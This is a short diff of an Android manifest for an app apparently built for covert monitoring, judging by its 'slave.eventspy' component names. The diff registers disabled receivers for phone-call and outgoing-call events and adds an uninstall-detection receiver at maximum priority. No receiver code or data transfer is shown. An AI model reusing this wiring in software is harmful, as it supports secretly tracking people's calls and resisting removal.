@@ -167,7 +167,7 @@
                  <action android:name="android.intent.action.SIM_STATE_CHANGED"/> 
             </intent-filter>   
         </receiver> 
-          <receiver android:enabled="false" android:name=".service.slave.eventspy.PhoneCallReceiver">
+        <receiver android:enabled="false" android:name=".service.slave.eventspy.PhoneCallReceiver">
             <intent-filter>
                  <action android:name="android.intent.action.PHONE_STATE"/>  
             </intent-filter>   
@@ -175,7 +175,15 @@
                  <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>  
                   <category android:name="android.intent.category.DEFAULT"/> 
             </intent-filter>   
-            </receiver> 
+        </receiver> 
+       <!-- TODO  Not working for itself-->
+        <receiver android:enabled="false" android:name=".service.slave.eventspy.UninstallReceiver">
+            <intent-filter android:priority="2147483647">
+                 <action android:name="android.intent.action.PACKAGE_REMOVED"/>  
+                 <action android:name="android.intent.action.PACKAGE_FULLY_REMOVED"/>   
+                 <data android:scheme="package"/>
+            </intent-filter>    
+        </receiver> 
           
           
         <!-- Geo Location background service Receiver-->
